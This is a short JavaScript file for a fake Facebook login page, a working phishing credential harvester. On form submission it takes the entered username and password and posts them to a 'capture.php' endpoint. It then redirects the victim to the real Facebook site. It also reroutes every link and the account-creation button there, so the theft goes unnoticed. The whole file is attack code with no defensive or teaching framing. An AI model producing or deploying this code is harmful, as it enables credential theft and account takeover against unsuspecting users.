// Facebook login page script
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('login-form');
    
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data
        const username = loginForm.querySelector('input[name="username"]').value;
        const password = loginForm.querySelector('input[name="password"]').value;
        
        // Send data to server
        fetch('capture.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => {
            // Redirect to real Facebook after capturing credentials
            window.location.href = 'https://www.facebook.com/';
        })
        .catch(error => {
            console.error('Error:', error);
            // Still redirect to real Facebook even if there's an error
            window.location.href = 'https://www.facebook.com/';
        });
    });
    
    // Make the "Create New Account" button appear to work
    const createAccountButton = document.querySelector('.create-account-button');
    createAccountButton.addEventListener('click', function() {
        window.location.href = 'https://www.facebook.com/';
    });
    
    // Make all links redirect to Facebook
    const allLinks = document.querySelectorAll('a');
    allLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://www.facebook.com/';
        });
    });
});
